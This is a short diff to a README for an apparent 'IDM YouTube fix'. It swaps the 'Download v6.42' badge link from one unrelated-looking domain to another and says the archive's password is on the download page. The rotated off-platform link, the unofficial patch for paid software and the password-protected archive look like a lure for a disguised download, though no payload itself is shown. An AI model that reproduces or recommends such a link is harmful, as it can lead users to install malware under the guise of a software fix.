@@ -18,7 +18,7 @@ Fixes IDM's YouTube download detection: updated URL parser, HLS/DASH stream supp
 
 ## Download
 
-[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/idmytfix)
+[![Download v6.42](https://img.shields.io/badge/Download_v6.42-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/idmytfix)
 
 > The archive password is shown on the download page.
 
